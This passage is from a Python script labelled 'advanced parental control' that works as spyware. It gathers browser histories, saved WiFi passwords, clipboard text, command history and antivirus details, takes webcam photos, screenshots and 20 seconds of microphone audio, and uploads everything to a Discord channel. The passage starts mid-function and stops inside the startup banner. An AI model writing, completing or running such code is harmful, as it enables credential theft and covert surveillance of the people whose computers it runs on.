            cv2.putText(frame, hora(), (10, 30), cv2.FONT_HERSHEY_SIMPLEX, 0.7, (0, 255, 0), 2)
            cv2.imwrite(arquivo, frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
            
            if os.path.exists(arquivo) and os.path.getsize(arquivo) > 1000:
                print("[+] Camera OK")
                return arquivo
    except Exception as e:
        print("[-] Erro camera: " + str(e))
    finally:
        if cap:
            cap.release()
    
    print("[-] Camera: captura falhou")
    return None

# [34] AUDIO
def capturar_audio(duracao=20):
    if not TEM_AUDIO:
        print("[-] Audio: dependencias nao instaladas")
        return None
    
    arquivo = os.path.join(PASTA, "audio", "audio_" + ts() + ".wav")
    
    print("[*] A gravar " + str(duracao) + " segundos de audio...")
    
    try:
        taxa = 44100
        audio = sd.rec(int(duracao * taxa), samplerate=taxa, channels=1, dtype="int16")
        sd.wait()
        wavfile.write(arquivo, taxa, audio)
        
        if os.path.exists(arquivo) and os.path.getsize(arquivo) > 1000:
            print("[+] Audio OK (" + str(duracao) + "s)")
            return arquivo
    except Exception as e:
        print("[-] Audio erro: " + str(e))
    
    return None

# [35] MULTIPLOS SCREENSHOTS
def capturar_screenshots_multiplos(quantidade=3, intervalo=2):
    screenshots = []
    print("[*] A capturar " + str(quantidade) + " screenshots...")
    
    for i in range(quantidade):
        arquivo = os.path.join(PASTA, "capturas", "multi_" + str(i+1) + "_" + ts() + ".png")
        try:
            with mss.mss() as sct:
                sct.shot(output=arquivo)
            if os.path.exists(arquivo):
                screenshots.append(arquivo)
                print("    [" + str(i+1) + "/" + str(quantidade) + "] OK")
        except:
            pass
        
        if i < quantidade - 1:
            time.sleep(intervalo)
    
    return screenshots

# ==================== SALVAR RELATORIOS ====================
def salvar_relatorio(nome, conteudo):
    try:
        arquivo = os.path.join(PASTA, "relatorios", nome + "_" + ts() + ".txt")
        with open(arquivo, "w", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write("  " + nome.upper() + "\n")
            f.write("  Gerado: " + hora() + "\n")
            f.write("=" * 60 + "\n\n")
            
            if isinstance(conteudo, list):
                for i, item in enumerate(conteudo, 1):
                    if isinstance(item, dict):
                        f.write("[" + str(i) + "]\n")
                        for k, v in item.items():
                            f.write("    " + str(k) + ": " + str(v) + "\n")
                        f.write("\n")
                    else:
                        f.write(str(i) + ". " + str(item) + "\n")
            elif isinstance(conteudo, dict):
                for k, v in conteudo.items():
                    f.write(str(k) + ": " + str(v) + "\n")
            else:
                f.write(str(conteudo))
        
        return arquivo
    except:
        return None

# ==================== EXECUCAO PRINCIPAL ====================
def executar():
    inicio = time.time()
    
    print("\n" + "=" * 65)
    print("  *** MONITORAMENTO INICIADO ***")
    print("  " + hora())
    print("=" * 65 + "\n")
    
    # ========== COLETA DE DADOS ==========
    print("[FASE 1/4] Recolhendo dados...\n")
    
    dados = {}
    
    dados["localizacao"] = get_localizacao()
    print("    [01/35] Localizacao: " + dados["localizacao"].get("cidade", "?"))
    
    dados["sistema"] = get_sistema()
    print("    [02/35] Sistema: OK")
    
    dados["processos"] = get_processos()
    print("    [03/35] Processos: " + str(len(dados["processos"])))
    
    dados["chrome_hist"] = get_chrome_history()
    print("    [04/35] Chrome History: " + str(len(dados["chrome_hist"])))
    
    dados["firefox_hist"] = get_firefox_history()
    print("    [05/35] Firefox History: " + str(len(dados["firefox_hist"])))
    
    dados["edge_hist"] = get_edge_history()
    print("    [06/35] Edge History: " + str(len(dados["edge_hist"])))
    
    dados["chrome_bookmarks"] = get_chrome_bookmarks()
    print("    [07/35] Chrome Bookmarks: " + str(len(dados["chrome_bookmarks"])))
    
    dados["chrome_ext"] = get_chrome_extensions()
    print("    [08/35] Chrome Extensions: " + str(len(dados["chrome_ext"])))
    
    dados["wifi"] = get_wifi_networks()
    print("    [09/35] WiFi Networks: " + str(len(dados["wifi"])))
    
    dados["wifi_pass"] = get_wifi_passwords()
    print("    [10/35] WiFi Passwords: " + str(len(dados["wifi_pass"])))
    
    dados["network"] = get_network_info()
    print("    [11/35] Network Info: OK")
    
    dados["ports"] = get_open_ports()
    print("    [12/35] Open Ports: " + str(len(dados["ports"])))
    
    dados["clipboard"] = get_clipboard()
    print("    [13/35] Clipboard: " + str(len(dados["clipboard"])) + " chars")
    
    dados["apps"] = get_installed_apps()
    print("    [14/35] Apps Installed: " + str(len(dados["apps"])))
    
    dados["startup"] = get_startup_programs()
    print("    [15/35] Startup Programs: " + str(len(dados["startup"])))
    
    dados["downloads"] = get_recent_downloads()
    print("    [16/35] Recent Downloads: " + str(len(dados["downloads"])))
    
    dados["documents"] = get_recent_documents()
    print("    [17/35] Recent Documents: " + str(len(dados["documents"])))
    
    dados["usb"] = get_usb_devices()
    print("    [18/35] USB Devices: " + str(len(dados["usb"])))
    
    dados["disks"] = get_disk_partitions()
    print("    [19/35] Disk Partitions: " + str(len(dados["disks"])))
    
    dados["users"] = get_logged_users()
    print("    [20/35] Logged Users: " + str(len(dados["users"])))
    
    dados["tasks"] = get_scheduled_tasks()
    print("    [21/35] Scheduled Tasks: " + str(len(dados["tasks"])))
    
    dados["printers"] = get_printers()
    print("    [22/35] Printers: " + str(len(dados["printers"])))
    
    dados["bluetooth"] = get_bluetooth_devices()
    print("    [23/35] Bluetooth: " + str(len(dados["bluetooth"])))
    
    dados["recent_files"] = get_recent_files()
    print("    [24/35] Recent Files: " + str(len(dados["recent_files"])))
    
    dados["antivirus"] = get_antivirus()
    print("    [25/35] Antivirus: " + str(len(dados["antivirus"])))
    
    dados["firewall"] = get_firewall_status()
    print("    [26/35] Firewall: OK")
    
    dados["env_vars"] = get_environment_vars()
    print("    [27/35] Environment: OK")
    
    dados["monitors"] = get_monitors()
    print("    [28/35] Monitors: " + str(len(dados["monitors"])))
    
    dados["services"] = get_running_services()
    print("    [29/35] Services: " + str(len(dados["services"])))
    
    dados["cmd_history"] = get_command_history()
    print("    [30/35] Command History: " + str(len(dados["cmd_history"])))
    
    dados["cookies"] = get_cookies_count()
    print("    [31/35] Cookies: OK")
    
    # ========== CAPTURAS ==========
    print("\n[FASE 2/4] Fazendo capturas...\n")
    
    print("    [32/35] Screenshot...")
    screenshot = capturar_screenshot()
    
    print("    [33/35] Camera...")
    camera = capturar_camera()
    
    print("    [34/35] Audio (20s)...")
    audio = capturar_audio(20)
    
    print("    [35/35] Screenshots multiplos...")
    multi_screens = capturar_screenshots_multiplos(3, 2)
    
    # ========== SALVAR RELATORIOS ==========
    print("\n[FASE 3/4] Salvando relatorios...\n")
    
    arquivos = []
    
    if dados["processos"]:
        a = salvar_relatorio("processos", dados["processos"])
        if a: arquivos.append(a)
    
    if dados["chrome_hist"]:
        a = salvar_relatorio("chrome_historico", dados["chrome_hist"])
        if a: arquivos.append(a)
    
    if dados["firefox_hist"]:
        a = salvar_relatorio("firefox_historico", dados["firefox_hist"])
        if a: arquivos.append(a)
    
    if dados["edge_hist"]:
        a = salvar_relatorio("edge_historico", dados["edge_hist"])
        if a: arquivos.append(a)
    
    if dados["wifi_pass"]:
        a = salvar_relatorio("wifi_senhas", dados["wifi_pass"])
        if a: arquivos.append(a)
    
    if dados["apps"]:
        a = salvar_relatorio("apps_instaladas", dados["apps"])
        if a: arquivos.append(a)
    
    if dados["downloads"]:
        a = salvar_relatorio("downloads_recentes", dados["downloads"])
        if a: arquivos.append(a)
    
    if dados["recent_files"]:
        a = salvar_relatorio("ficheiros_recentes", dados["recent_files"])
        if a: arquivos.append(a)
    
    print("    Salvos " + str(len(arquivos)) + " relatorios")
    
    # ========== ENVIAR PARA DISCORD ==========
    print("\n[FASE 4/4] Enviando para Discord...\n")
    
    # Separador inicial
    discord_separador("INICIO DO RELATORIO - " + hora())
    time.sleep(0.5)
    
    # [1] LOCALIZACAO
    loc = dados["localizacao"]
    campos_loc = [
        ("🌐 IP Publico", loc.get("ip", "?"), True),
        ("🏙️ Cidade", loc.get("cidade", "?"), True),
        ("🗺️ Regiao", loc.get("regiao", "?"), True),
        ("🌍 Pais", loc.get("pais", "?") + " (" + loc.get("codigo_pais", "?") + ")", True),
        ("📡 ISP", loc.get("isp", "?"), True),
        ("🏢 Organizacao", loc.get("org", "?")[:30], True),
        ("📍 Coordenadas", loc.get("lat", "?") + ", " + loc.get("lon", "?"), True),
        ("🕐 Timezone", loc.get("timezone", "?"), True)
    ]
    discord_embed("📍 LOCALIZACAO", "Informacoes de geolocalizacao baseadas no IP", 3066993, campos_loc)
    time.sleep(0.8)
    
    # [2] SISTEMA
    sis = dados["sistema"]
    campos_sis = [
        ("💻 Hostname", sis.get("hostname", "?"), True),
        ("👤 Usuario", sis.get("usuario", "?"), True),
        ("🖥️ Sistema", sis.get("so", "?"), True),
        ("🏗️ Arquitetura", sis.get("arquitetura", "?"), True),
        ("⚙️ Processador", sis.get("processador", "?")[:25], False),
        ("🧮 Nucleos", sis.get("nucleos_fisicos", "?") + " fisicos / " + sis.get("nucleos_logicos", "?") + " logicos", True),
        ("📊 CPU Uso", sis.get("cpu_uso", "?"), True),
        ("🕐 CPU Freq", sis.get("cpu_freq_atual", "?"), True)
    ]
    discord_embed("🖥️ SISTEMA", "Informacoes do computador", 15105570, campos_sis)
    time.sleep(0.8)
    
    # [3] RECURSOS
    campos_rec = [
        ("🧠 RAM Total", sis.get("ram_total", "?"), True),
        ("🧠 RAM Usada", sis.get("ram_usada", "?") + " (" + sis.get("ram_percent", "?") + ")", True),
        ("🧠 RAM Livre", sis.get("ram_livre", "?"), True),
        ("💾 Disco Total", sis.get("disco_total", "?"), True),
        ("💾 Disco Usado", sis.get("disco_usado", "?") + " (" + sis.get("disco_percent", "?") + ")", True),
        ("💾 Disco Livre", sis.get("disco_livre", "?"), True),
        ("🔋 Bateria", sis.get("bateria", "?"), True),
        ("🔌 A Carregar", sis.get("a_carregar", "?"), True),
        ("⏱️ Tempo Restante", sis.get("tempo_bateria", "?"), True)
    ]
    discord_embed("📊 RECURSOS DO SISTEMA", "CPU, RAM, Disco e Bateria", 10181046, campos_rec)
    time.sleep(0.8)
    
    # [4] UPTIME
    campos_up = [
        ("🕐 Ligado Desde", sis.get("boot_time", "?"), True),
        ("⏱️ Tempo Ligado", sis.get("uptime", "?"), True)
    ]
    discord_embed("⏰ UPTIME", "Tempo de atividade do sistema", 15844367, campos_up)
    time.sleep(0.8)
    
    # [5] REDE
    net = dados["network"]
    campos_net = [
        ("🏠 Hostname", net.get("hostname", "?"), True),
        ("📍 IP Local", net.get("ip_local", "?"), True),
        ("🔗 MAC Address", net.get("mac", "?"), True),
        ("📤 Bytes Enviados", net.get("bytes_enviados", "?"), True),
        ("📥 Bytes Recebidos", net.get("bytes_recebidos", "?"), True),
        ("🔗 Conexoes Ativas", str(net.get("conexoes_established", "?")), True),
        ("👂 Portas Listening", str(net.get("conexoes_listen", "?")), True)
    ]
    discord_embed("🌐 REDE", "Informacoes de rede local", 3447003, campos_net)
    time.sleep(0.8)
    
    # [6] WIFI
    if dados["wifi"]:
        wifi_list = "\n".join(["• " + w for w in dados["wifi"][:15]])
        discord_embed("📶 REDES WIFI CONHECIDAS", "```\n" + wifi_list + "\n```", 1752220)
        time.sleep(0.8)
    
    # [7] SENHAS WIFI
    if dados["wifi_pass"]:
        senhas_txt = ""
        for w in dados["wifi_pass"][:20]:
            senhas_txt += "📶 " + w["rede"] + "\n   🔑 " + w["senha"] + "\n\n"
        discord_embed("🔐 SENHAS WIFI", "```\n" + senhas_txt[:1900] + "\n```", 15158332)
        time.sleep(0.8)
    
    # [8] PROCESSOS TOP 15
    if dados["processos"]:
        proc_txt = ""
        for p in dados["processos"][:15]:
            proc_txt += p["nome"][:20].ljust(22) + " RAM: " + str(p["ram"]).rjust(5) + "% | PID: " + str(p["pid"]) + "\n"
        discord_embed("⚡ TOP 15 PROCESSOS (RAM)", "```\n" + proc_txt + "\n```", 15844367)
        time.sleep(0.8)
    
    # [9] TOTAIS
    campos_totais = [
        ("⚡ Processos", str(len(dados["processos"])), True),
        ("🌐 Chrome", str(len(dados["chrome_hist"])) + " sites", True),
        ("🦊 Firefox", str(len(dados["firefox_hist"])) + " sites", True),
        ("🔵 Edge", str(len(dados["edge_hist"])) + " sites", True),
        ("⭐ Favoritos", str(len(dados["chrome_bookmarks"])), True),
        ("🧩 Extensoes", str(len(dados["chrome_ext"])), True),
        ("📶 WiFi", str(len(dados["wifi"])) + " redes", True),
        ("🔑 WiFi Pass", str(len(dados["wifi_pass"])), True),
        ("📦 Apps", str(len(dados["apps"])), True),
        ("🚀 Startup", str(len(dados["startup"])), True),
        ("📥 Downloads", str(len(dados["downloads"])), True),
        ("📄 Documentos", str(len(dados["documents"])), True),
        ("🔌 USB", str(len(dados["usb"])), True),
        ("💽 Discos", str(len(dados["disks"])), True),
        ("🖨️ Impressoras", str(len(dados["printers"])), True),
        ("🔵 Bluetooth", str(len(dados["bluetooth"])), True),
        ("🛡️ Antivirus", str(len(dados["antivirus"])), True),
        ("⚙️ Servicos", str(len(dados["services"])), True)
    ]
    discord_embed("📊 RESUMO - TOTAIS", "Quantidade de itens encontrados", 9807270, campos_totais)
    time.sleep(0.8)
    
    # [10] CLIPBOARD
    if dados["clipboard"] and len(dados["clipboard"]) > 5:
        clip_txt = dados["clipboard"][:1800]
        discord_embed("📋 CLIPBOARD (Area de Transferencia)", "```\n" + clip_txt + "\n```", 16776960)
        time.sleep(0.8)
    
    # [11] ANTIVIRUS
    if dados["antivirus"]:
        av_txt = "\n".join(["🛡️ " + av for av in dados["antivirus"]])
        discord_embed("🛡️ ANTIVIRUS DETECTADOS", "```\n" + av_txt + "\n```", 5763719)
        time.sleep(0.8)
    
    # [12] USB
    if dados["usb"]:
        usb_txt = "\n".join(["🔌 " + u[:55] for u in dados["usb"][:15]])
        discord_embed("🔌 DISPOSITIVOS USB", "```\n" + usb_txt + "\n```", 9936031)
        time.sleep(0.8)
    
    # [13] DISCOS
    if dados["disks"]:
        disk_txt = ""
        for d in dados["disks"]:
            disk_txt += "💽 " + d["drive"] + " (" + d["tipo"] + ")\n"
            disk_txt += "   Total: " + d["total"] + " | Usado: " + d["usado"] + " | Livre: " + d["livre"] + "\n\n"
        discord_embed("💽 PARTICOES DE DISCO", "```\n" + disk_txt[:1900] + "\n```", 8421504)
        time.sleep(0.8)
    
    # ========== ENVIAR CAPTURAS ==========
    discord_separador("CAPTURAS DE TELA E CAMERA")
    time.sleep(0.5)
    
    if camera:
        discord_arquivo(camera, "📸 FOTO DA WEBCAM", "Captura da camera - Quem esta usando o PC")
        time.sleep(1)
    
    if screenshot:
        discord_arquivo(screenshot, "🖼️ SCREENSHOT", "Captura do ecra - O que esta a fazer")
        time.sleep(1)
    
    for i, scr in enumerate(multi_screens, 1):
        discord_arquivo(scr, "🖼️ SCREENSHOT " + str(i) + "/3", "Captura multipla")
        time.sleep(1)
    
    if audio:
        discord_arquivo(audio, "🎤 GRAVACAO DE AUDIO", "Audio ambiente - 20 segundos")
        time.sleep(1)
    
    # ========== ENVIAR RELATORIOS ==========
    if arquivos:
        discord_separador("RELATORIOS DETALHADOS")
        time.sleep(0.5)
        
        for arq in arquivos:
            nome = os.path.basename(arq)
            discord_arquivo(arq, "📄 " + nome.split("_")[0].upper(), "Relatorio completo em TXT")
            time.sleep(0.8)
    
    # Separador final
    tempo_total = round(time.time() - inicio, 1)
    discord_separador("FIM DO RELATORIO - Tempo: " + str(tempo_total) + "s")
    
    print("\n" + "=" * 65)
    print("  *** MONITORAMENTO CONCLUIDO ***")
    print("  Tempo total: " + str(tempo_total) + " segundos")
    print("=" * 65 + "\n")

# ==================== MAIN ====================
if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║           🛡️  CONTROLE PARENTAL AVANCADO  🛡️                  ║
    ║                   35+ FUNCIONALIDADES                         ║
    ║                                                               ║
    ╠═══════════════════════════════════════════════════════════════╣
    ║                                                               ║
    ║  📍 Localizacao IP        📶 WiFi + Senhas                    ║
    ║  🖥️ Sistema Completo      🌐 Rede + Portas                    ║
    ║  ⚡ Processos             📋 Clipboard                        ║
    ║  🌐 Chrome History  
